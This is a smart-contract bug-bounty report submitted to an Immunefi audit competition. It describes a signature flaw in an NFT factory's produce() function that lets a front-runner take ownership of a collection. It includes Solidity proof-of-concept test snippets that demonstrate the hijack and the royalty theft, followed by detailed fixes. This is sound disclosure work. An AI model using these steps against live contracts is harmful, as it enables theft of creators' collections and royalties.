# 57236 sc medium accesstoken collection front running attack permanent ownership hijack&#x20;

**Submitted on Oct 24th 2025 at 16:01:27 UTC by @failsafe\_intern for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57236
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/utils/SignatureVerifier.sol>
* **Impacts:**
  * Theft of unclaimed royalties
  * Unintended alteration of what the NFT represents (e.g. token URI, payload, artistic content)

## Description

### Vulnerability Overview

`Factory.produce()` validates `AccessTokenInfo` signatures but the signed message omits the intended creator/owner and includes no nonce or expiration. Any party with a valid signature can front-run the legitimate creator and deploy the collection under their own ownership, permanently blocking the rightful deployment due to deterministic salt collision.

### Root Cause

**SignatureVerifier.sol:51-72** - `checkAccessTokenInfo` signature omits creator:

```solidity
function checkAccessTokenInfo(address signer, AccessTokenInfo memory accessTokenInfo) external view {
    require(
        signer.isValidSignatureNow(
            keccak256(
                abi.encodePacked(
                    accessTokenInfo.metadata.name,
                    accessTokenInfo.metadata.symbol,
                    accessTokenInfo.contractURI,
                    accessTokenInfo.feeNumerator,
                    block.chainid
                )
            ),
            accessTokenInfo.signature
        ),
        InvalidSignature()
    );
}
```

**Missing from hash**: intended creator address, nonce, expiration timestamp.

**Factory.sol:175-239** - `produce` sets `creator = msg.sender` after signature validation:

```solidity
function produce(AccessTokenInfo memory accessTokenInfo, bytes32 referralCode)
    external
    returns (address nftAddress)
{
    // LINE 191: Validates incomplete signature
    factoryParameters.signerAddress.checkAccessTokenInfo(accessTokenInfo);
    
    // LINE 193: Deterministic salt from (name, symbol) only
    bytes32 hashedSalt = _metadataHash(accessTokenInfo.metadata.name, accessTokenInfo.metadata.symbol);
    
    // LINE 195: Prevents duplicate deployment
    require(getNftInstanceInfo[hashedSalt].nftAddress == address(0), TokenAlreadyExists());
    
    // LINE 224-230: Sets creator to msg.sender (not validated!)
    AccessToken(nftAddress).initialize(
        AccessToken.AccessTokenParameters({
            factory: Factory(address(this)),
            info: accessTokenInfo,
            creator: msg.sender,  // ← ATTACKER becomes owner
            feeReceiver: receiver,
            referralCode: referralCode
        }),
        factoryParameters.transferValidator
    );
}
```

### Attack Flow

{% stepper %}
{% step %}

### Step

Attacker obtains a valid signature (mempool observation, leaked backend data, or social engineering) containing `(name, symbol, contractURI, feeNumerator, chainid)`.
{% endstep %}

{% step %}

### Step

Attacker front-runs the legitimate creator transaction by calling `Factory.produce()` first.
{% endstep %}

{% step %}

### Step

Signature validation passes because only metadata/feeNumerator are checked (LINE 191).
{% endstep %}

{% step %}

### Step

Factory sets `creator = msg.sender` (LINE 228) — attacker address becomes collection owner.
{% endstep %}

{% step %}

### Step

Attacker's collection deployed to deterministic address based on `keccak256(abi.encode(name, symbol))`. Legitimate creator's transaction reverts with `TokenAlreadyExists()` (LINE 195).
{% endstep %}

{% step %}

### Step

Permanent hijack: Same `(name, symbol)` cannot be redeployed; brand is captured by attacker.
{% endstep %}
{% endstepper %}

### Impact

**Impact Category**: Unintended alteration of what the NFT represents (e.g. token URI, payload, artistic content)

**Operational Damage**:

* **Complete ownership takeover**: Attacker controls collection royalties, minting, metadata, and all creator functions
* **Brand capture**: Legitimate creator permanently blocked from using their own collection name/symbol
* **Royalty theft**: Attacker receives all secondary sale royalties intended for legitimate creator
* **Reputation damage**: Fake collection under attacker control tarnishes brand
* **No recovery**: Deterministic deployment prevents legitimate redeployment without contract upgrade

**Business Impact**:

* Creators lose anticipated royalty revenue (potentially significant for popular collections)
* Platform reputation damaged when creators discover collections hijacked
* Backend signature credentials must be immediately rotated if compromised
* Legal/customer support costs to resolve ownership disputes

## Link to Proof of Concept

<https://gist.github.com/Joshua-Medvinsky/35c232c0b9da435fd072f742319671c0>

## Proof of Concept

**GitHub Gist POC**: <https://gist.github.com/Joshua-Medvinsky/35c232c0b9da435fd072f742319671c0>

**Test Results**: ✅ **7/7 tests passed** (front-running, permanent blocking, royalty theft demonstrated)

### Prerequisites

```solidity
// Attacker needs:
// 1. Valid AccessTokenInfo signature from backend signer
// 2. Ability to submit transaction before legitimate creator
// 3. No capital required (only gas cost)
```

### Attack Execution

{% stepper %}
{% step %}

### Capture Valid Signature

```solidity
// Attacker monitors mempool or backend, obtains:
AccessTokenInfo memory legitInfo = AccessTokenInfo({
    metadata: NftMetadata({
        name: "ArtistCollection",
        symbol: "ART"
    }),
    contractURI: "ipfs://Qm...",
    feeNumerator: 500,  // 5% royalty
    paymentToken: address(usdc),
    signature: validSignature  // ← This is all attacker needs
});

// Legitimate creator transaction pending in mempool
```

{% endstep %}

{% step %}

### Front-Run with Higher Gas

```solidity
// Attacker calls produce() with SAME signature but attacker as tx.origin:
address attackerCollection = factory.produce(
    legitInfo,          // SAME signature/metadata
    bytes32(0)          // No referral
);

// Transaction mines BEFORE legitimate creator due to higher gas price
```

{% endstep %}

{% step %}

### Verify Hijack

```solidity
// After attacker transaction:
NftInstanceInfo memory info = factory.getNftInstanceInfo(
    keccak256(abi.encode("ArtistCollection", "ART"))
);

assertEq(
    info.creator,
    attacker,  // Attacker is now collection owner
    "Collection hijacked"
);

assertEq(
    info.nftAddress,
    attackerCollection,  // Deployed to deterministic address
    "Collection deployed"
);

// Attacker now owns collection
AccessToken attackerToken = AccessToken(attackerCollection);
assertEq(attackerToken.owner(), attacker, "Attacker is owner");
```

{% endstep %}

{% step %}

### Legitimate Creator Blocked

```solidity
// When legitimate creator transaction executes:
vm.prank(legitimateCreator);
vm.expectRevert(TokenAlreadyExists.selector);
factory.produce(legitInfo, bytes32(0));

// Legitimate creator PERMANENTLY BLOCKED from deploying
// Same (name, symbol) cannot be redeployed due to deterministic salt
```

{% endstep %}

{% step %}

### Demonstrate Royalty Theft

```solidity
// Attacker configured as royalty receiver during deployment
(address receiver, uint256 royaltyAmount) = attackerToken.royaltyInfo(
    tokenId, 
    10000e6  // $10,000 sale
);

assertEq(
    receiver,
    attackerRoyaltiesReceiver,  // Attacker receives royalties
    "Royalties redirected to attacker"
);

assertEq(
    royaltyAmount,
    500e6,  // $500 royalty (5%)
    "Attacker steals creator royalties"
);
```

{% endstep %}
{% endstepper %}

### Expected vs Actual Behavior

**Expected**: Signature should authorize collection creation only for a specific creator address.

**Actual**: Signature authorizes collection creation for ANY caller, enabling first-come-first-served ownership race.

## Recommended Fix

### Immediate Fix (Contract Upgrade Required)

Modify `checkAccessTokenInfo` to include the intended creator in the signed payload:

```solidity
function checkAccessTokenInfo(
    address signer, 
    AccessTokenInfo memory accessTokenInfo,
    address intendedCreator  // ← ADD parameter
) external view {
    require(
        signer.isValidSignatureNow(
            keccak256(
                abi.encodePacked(
                    accessTokenInfo.metadata.name,
                    accessTokenInfo.metadata.symbol,
                    accessTokenInfo.contractURI,
                    accessTokenInfo.feeNumerator,
                    intendedCreator,  // ← ADD to hash
                    block.chainid
                )
            ),
            accessTokenInfo.signature
        ),
        InvalidSignature()
    );
}
```

Update `Factory.produce` to bind the signature to the caller:

```solidity
function produce(
    AccessTokenInfo memory accessTokenInfo, 
    bytes32 referralCode
) external returns (address nftAddress) {
    // Validate signature includes msg.sender as intended creator
    factoryParameters.signerAddress.checkAccessTokenInfo(
        accessTokenInfo,
        msg.sender  // ← ADD: Bind signature to caller
    );
    
    // Rest of function unchanged
    // Now only msg.sender matching signature can deploy
}
```

Add nonce protection:

* Add state variable in Factory:

```solidity
mapping(address => uint256) public creatorNonces;
```

* Add nonce to `AccessTokenInfo` struct:

```solidity
struct AccessTokenInfo {
    NftMetadata metadata;
    string contractURI;
    uint96 feeNumerator;
    address paymentToken;
    uint256 nonce;      // ← ADD
    bytes signature;
}
```

* Include nonce in signature hash:

```solidity
keccak256(abi.encodePacked(
    accessTokenInfo.metadata.name,
    accessTokenInfo.metadata.symbol,
    accessTokenInfo.contractURI,
    accessTokenInfo.feeNumerator,
    intendedCreator,
    accessTokenInfo.nonce,  // ← ADD
    block.chainid
));
```

* Validate and increment in `produce()`:

```solidity
require(accessTokenInfo.nonce == creatorNonces[msg.sender], "Invalid nonce");
creatorNonces[msg.sender]++;
```

Add expiration timestamp:

* Add to `AccessTokenInfo` struct:

```solidity
uint256 deadline;
```

* Validate in `produce()`:

```solidity
require(block.timestamp <= accessTokenInfo.deadline, "Signature expired");
```

### Defense-in-Depth Recommendations

1. Commit-Reveal Scheme: Creator commits to deployment before revealing signature
2. Allowlist: Maintain on-chain registry of creator addresses authorized to deploy
3. Two-Step Deployment: Creator registers intent on-chain before final deployment
4. Backend Rate Limiting: Issue signatures only after verifying requester identity
5. Signature Revocation: Backend maintains revocable signature registry

## References

* **Vulnerable Function**: `checkAccessTokenInfo` (SignatureVerifier.sol:51-72)
* **Exploitable Function**: `produce` (Factory.sol:175-239)
* **Ownership Assignment**: `AccessToken.initialize` (AccessToken.sol:86-101)
* **Deterministic Salt**: `_metadataHash` (Factory.sol:193)
